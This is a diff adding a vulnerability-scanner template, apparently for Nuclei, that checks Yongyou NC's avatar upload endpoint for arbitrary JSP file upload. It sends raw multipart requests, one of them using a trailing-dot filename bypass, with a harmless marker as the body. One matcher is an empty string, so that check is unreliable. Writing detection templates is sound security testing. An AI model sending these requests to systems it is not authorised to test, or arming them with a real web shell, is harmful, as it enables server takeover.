@@ -1,0 +1,49 @@
+id: poc-yaml-yongyou-avatar-upload
+info:
+  name: Yongyou NC Avatar Upload File Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload,vulnerability,yongyou-nc
+http:
+  - raw:
+      - |
+        POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+        Content-Disposition: form-data; name="file"; filename="111.jsp."
+        Content-Type: application/octet-stream
+
+        vulnerability
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+  - raw:
+      - |
+        POST /uapim/upload/avatar?usercode=1&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+        Content-Disposition: form-data; name="file"; filename="111.jsp"
+        Content-Type: application/octet-stream
+
+        vulnerability
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
